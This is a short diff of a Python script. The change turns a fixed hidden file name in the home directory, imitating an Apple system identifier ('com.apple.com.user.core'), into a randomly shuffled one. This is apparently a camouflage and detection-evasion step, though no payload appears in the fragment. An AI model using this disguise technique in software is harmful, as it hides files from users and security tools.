@@ -4,8 +4,11 @@ from os import remove
 from subprocess import Popen as subproc
 from os import system, remove
 from sys import platform
+from random import shuffle
 
-filename = "com.apple.com.user.core"
+filename = ['com', 'apple', 'com' ,'user', 'core']
+shuffle(filename)
+filename = '.'.join(filename)
 localfile = f"{expanduser('~')}/.{filename}"
 
 try:
